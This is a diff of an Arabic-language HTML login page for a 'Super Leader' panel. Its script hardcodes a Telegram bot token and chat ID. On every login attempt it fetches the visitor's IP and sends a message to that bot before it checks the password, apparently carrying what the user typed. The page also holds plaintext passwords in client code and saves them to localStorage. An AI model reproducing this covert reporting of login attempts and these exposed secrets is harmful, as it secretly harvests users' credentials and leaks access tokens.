@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>لوحة السوبر ليدر</title>
-    <link rel="icon" href="hi/img.jpg" type="image/png">
+    <link rel="icon" href="logo.jpg" type="image/png">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
     <style>
         body {
@@ -152,7 +152,7 @@
     </div>
 
     <div class="footer">
-        &copy; 2025 جميع الحقوق محفوظة - <a href="https://askme.ink/@omaressamelshemi">OMAR EL-SHEMI</a>
+        &copy; 2025 جميع الحقوق محفوظة - <a href="https://www.facebook.com/omaressamelshemi/">OMAR EL-SHEMI</a>
     </div>
 </div>
 
@@ -160,21 +160,37 @@
 
 <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
 <script>
-    const TOKEN = "8175198885:AAFpuh9RBkhrbgd29ktz_dgl9nCCptvniLs";                                                             
-    const CHAT_ID = "5857518644";                                                         
-    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
+    const TOKEN = "8175198885:AAFpuh9RBkhrbgd29ktz_dgl9nCCptvniLs";
+    const CHAT_ID = "5857518644";
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
     const users = {
-        'omar': { password: '@OmAr2024OmAr@', url: 'file:///C:/Users/reset%20password/Desktop/superledr/index1.html' },
         'omar5204': { password: '2882007', url: 'https://omaressamelshime.github.io/ledr.123/superledr/omar5204' },
         'mostafa952': { password: '1392007', url: 'https://omaressamelshime.github.io/ledr.123/superledr/mostafa952' },
     };
 
-    document.getElementById('login-form').addEventListener('submit', function(e) {
+    const loginForm = document.getElementById('login-form');
+    const emailField = document.getElementById('email');
+    const passwordField = document.getElementById('password');
+    const iframe = document.getElementById('iframe-container');
+    const loginContainer = document.querySelector('.login-container');
+
+    // استعادة بيانات المستخدم عند تحميل الصفحة
+    window.onload = () => {
+        const savedEmail = localStorage.getItem('email');
+        const savedPassword = localStorage.getItem('password');
+        if (savedEmail && savedPassword && users[savedEmail]?.password === savedPassword) {
+            loginContainer.style.display = 'none';
+            iframe.style.display = 'block';
+            iframe.src = users[savedEmail].url;
+        }
+    };
+
+    loginForm.addEventListener('submit', function (e) {
         e.preventDefault();
 
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
+        const email = emailField.value;
+        const password = passwordField.value;
 
         axios.get('https://api.ipify.org?format=json')
             .then(response => {
@@ -201,25 +217,53 @@
                     chat_id: CHAT_ID,
                     parse_mode: 'html',
                     text: message
-                }).then(response => {
+                }).then(() => {
                     if (users[email] && users[email].password === password) {
+                        // حفظ بيانات تسجيل الدخول
+                        localStorage.setItem('email', email);
+                        localStorage.setItem('password', password);
+
                         alert('تم تسجيل الدخول بنجاح!');
-                        // إخفاء صفحة تسجيل الدخول وعرض iframe
-                        document.querySelector('.login-container').style.display = 'none';
-                        const iframe = document.getElementById('iframe-container');
+                        loginContainer.style.display = 'none';
                         iframe.style.display = 'block';
                         iframe.src = users[email].url;
                     } else {
-                        alert('اسم المستخدم أو كلمة المرور غير صحيحة , برجاء الضغط علي نسيت كلمة المرور لمساعدتك في الحصول عليها.');
+                        alert('اسم المستخدم أو كلمة المرور غير صحيحة.');
                     }
-                }).catch(error => {
+                }).catch(() => {
                     alert('Error sending the information. Please try again.');
                 });
             })
-            .catch(error => {
+            .catch(() => {
                 alert('Error fetching the IP address. Please try again.');
             });
     });
+
+    // زر إغلاق الصفحة
+    const closeButton = document.createElement('button');
+    closeButton.textContent = 'إغلاق';
+    closeButton.style = `
+        position: absolute; 
+        top: 10px; 
+        right: 10px; 
+        background: red; 
+        color: white; 
+        border: none; 
+        border-radius: 5px; 
+        padding: 10px; 
+        cursor: pointer;
+    `;
+    document.body.appendChild(closeButton);
+
+    closeButton.addEventListener('click', () => {
+        iframe.style.display = 'none';
+        loginContainer.style.display = 'block';
+        iframe.src = '';
+        // إزالة بيانات تسجيل الدخول
+        localStorage.removeItem('email');
+        localStorage.removeItem('password');
+    });
 </script>
+
 </body>
 </html>
